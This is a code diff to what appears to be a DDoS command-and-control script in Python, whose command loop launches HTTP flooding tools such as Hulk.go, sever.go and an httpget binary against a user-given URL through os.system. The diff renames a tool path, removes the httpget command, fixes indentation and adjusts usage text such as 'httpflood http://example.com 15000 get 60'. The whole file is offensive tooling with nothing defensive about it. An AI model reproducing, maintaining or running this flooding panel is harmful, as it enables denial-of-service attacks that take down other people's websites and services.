@@ -575,7 +575,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
-                os.system(f'go run Hulk.go -site {url} -data {method}')
+                os.system(f'go run hulk.go -site {url} -data {method}')
             except IndexError:
                 print('Usage: crash <url> METHODS<GET/POST>')
                 print('Example: crash http://example.com GET')
@@ -591,23 +591,15 @@ def main():
                 print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                 print('Example: httpflood http://example.com 15000 get 60')
 
-        elif "httpget" in cnc:
-            try:
-                url = cnc.split()[1]
-                os.system(f'./httpget {url} 10000 50 100')
-            except IndexError:
-                print('Usage: httpget <url>')
-                print('Example: httpget http://example.com')
-                
-         elif "sever" in cnc:
+        elif "sever" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
-                os.system(f'go run sever.go -site {url} -data {method}')
+                os.system(f'go run sever.go -site {url} {method}')
             except IndexError:
-                print('Usage: sever <url> METHODS<GET/POST>')
-                print('Example: sever http://example.com GET')
-
+                print('Usage: sever <url> <GET/POST>')
+                print('Example: sever https://example.com GET')
+                
 # BANNERS
 
         elif "troll" in cnc:
